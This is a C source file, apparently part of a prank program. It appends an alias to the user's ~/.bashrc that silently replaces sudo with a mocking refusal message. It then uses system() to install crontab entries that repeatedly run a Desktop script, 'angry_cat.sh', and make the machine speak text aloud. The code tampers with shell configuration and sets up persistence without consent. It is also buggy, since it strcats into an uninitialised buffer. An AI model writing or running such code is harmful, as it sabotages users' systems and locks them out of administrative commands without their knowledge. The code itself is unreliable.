#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <sys/types.h>
#include <string.h>

char* get_home() {
    char *fileloc;
    if ((fileloc = getenv("HOME")) == NULL) {
        fileloc = getpwuid(getuid())->pw_dir;
    }

    return fileloc;
}

void bashrc_edit(char* home_loc) {
    char *file = "/.bashrc";

    int path_len = strlen(home_loc) + strlen(file) + 1;

    char *fileloc = (char*)malloc(path_len);

    strcat(fileloc, home_loc);
    strcat(fileloc, file);

    FILE *fptr;
    fptr = fopen(fileloc, "a");
    if(fptr == NULL)
    {
        printf("Error! Could not write to file.");   
        exit(1);             
    }
    
    fprintf(fptr, "\n\nalias sudo=\"echo 'My apologies, $USER, I cannot allow you to'\"\n");

    fclose(fptr);

    char src_cmd[50] = ". ";
    strcat(src_cmd, fileloc);

    system(src_cmd);

    free(fileloc);
}


void add_cron_script(char *home_loc, char *cmd_start, char *cmd_end) {
    char *script_loc = "/Desktop/angry_cat.sh";
    
    int cmd_size = strlen(home_loc) + strlen(script_loc) + strlen(cmd_start) + strlen(cmd_end) + 5;
    char *cron_cmd = (char*)calloc(cmd_size, sizeof(char));

    strcat(cron_cmd, cmd_start);
    strcat(cron_cmd, home_loc);
    strcat(cron_cmd, script_loc);
    strcat(cron_cmd, cmd_end);

    system(cron_cmd);

    free(cron_cmd);
}

void add_cron_speak(char *text, char *cmd_start, char *cmd_end) {
    char *speak_cmd = "/usr/bin/spd-say '";
    // char *cmd_start = "( (crontab -l 2>/dev/null || echo "")  ; echo \"*/7 * * * * export XDG_RUNTIME_DIR=/run/user/1000 && ";
    // char *cmd_end = "'\") | sort -u - | crontab -";
    
    int speak_cmd_size = strlen(speak_cmd) + strlen(text) + strlen(cmd_start) + strlen(cmd_end) + 5;
    char *cron_speak = (char*)calloc(speak_cmd_size, sizeof(char));

    strcat(cron_speak, cmd_start);
    strcat(cron_speak, speak_cmd);
    strcat(cron_speak, text);
    strcat(cron_speak, cmd_end);

    system(cron_speak);

    free(cron_speak);
}
